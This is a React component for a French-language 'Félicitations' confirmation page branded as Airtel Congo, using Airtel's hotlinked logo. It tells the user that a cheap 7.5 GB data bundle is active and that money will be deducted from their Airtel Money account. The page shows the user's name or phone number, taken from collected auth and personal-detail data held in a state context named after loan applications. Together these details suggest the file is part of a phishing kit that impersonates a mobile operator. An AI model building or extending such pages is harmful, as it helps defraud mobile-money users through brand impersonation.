import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Status.css';

export default function Status() {
  const navigate = useNavigate();
  const { selectedPlan, personalDetailsData, authData } = useLoanApplication();

  const planData = selectedPlan || { data: '7.5 GB', price: 0.49 };

  const userName =
    `${personalDetailsData.firstName || ''} ${personalDetailsData.lastName || ''}`.trim() ||
    authData?.phoneNumber ||
    'Cher Client';

  const handleReturnHome = () => {
    navigate('/');
  };

  return (
    <div className="st-root">
      {/* Background */}
      <div className="st-bg-blob st-bg-blob-1" />
      <div className="st-bg-blob st-bg-blob-2" />

      <div className="st-content">
        {/* Confetti-style top bar */}
        <div className="st-topbar">
          <img
            src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg"
            alt="Airtel"
            className="st-logo"
          />
        </div>

        {/* Success icon */}
        <div className="st-icon-wrap">
          <div className="st-icon-ring st-ring-3" />
          <div className="st-icon-ring st-ring-2" />
          <div className="st-icon-ring st-ring-1" />
          <div className="st-icon-circle">
            <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
              <path
                d="M10 22l8.5 8.5L34 14"
                stroke="#fff"
                strokeWidth="4.5"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </div>
        </div>

        {/* Title */}
        <div className="st-congrats-label">🎉 Félicitations!</div>
        <h1 className="st-title">{userName}</h1>

        {/* Data credit card */}
        <div className="st-credit-card">
          <div className="st-credit-top">
            <span className="st-credit-icon">📶</span>
            <span className="st-credit-tag">Forfait Activé</span>
          </div>

          <div className="st-credit-data">
            <span className="st-credit-amount">{planData.data}</span>
          </div>

          <p className="st-credit-msg">
            sera automatiquement crédité et ajouté à votre compte Airtel Money
          </p>

          <div className="st-credit-divider" />

          <div className="st-credit-detail-row">
            <span className="st-credit-detail-label">Montant à déduire</span>
            <span className="st-credit-detail-val">${planData.price?.toFixed(2)}</span>
          </div>
          {planData.validity && (
            <div className="st-credit-detail-row">
              <span className="st-credit-detail-label">Validité</span>
              <span className="st-credit-detail-val">{planData.validity}</span>
            </div>
          )}
          <div className="st-credit-detail-row">
            <span className="st-credit-detail-label">Statut</span>
            <span className="st-credit-detail-val st-status-active">✓ Actif</span>
          </div>
        </div>

        {/* Info box */}
        <div className="st-info-box">
          <div className="st-info-icon">📱</div>
          <p className="st-info-text">
            Assurez-vous d'avoir suffisamment d'argent sur le compte pour l'achat. Vous recevrez un SMS de confirmation dans les prochaines minutes. Profitez de votre connexion internet! Si les fonds sont insuffisants, l'achat échouera automatiquement.
          </p>
        </div>

        {/* Return button */}
        <button className="st-home-btn" onClick={handleReturnHome}>
          <span className="st-home-icon">🏠</span>
          Retour à l'Accueil
        </button>

        <p className="st-footer-text">© 2026 Airtel Congo. Tous droits réservés.</p>
      </div>
    </div>
  );
}
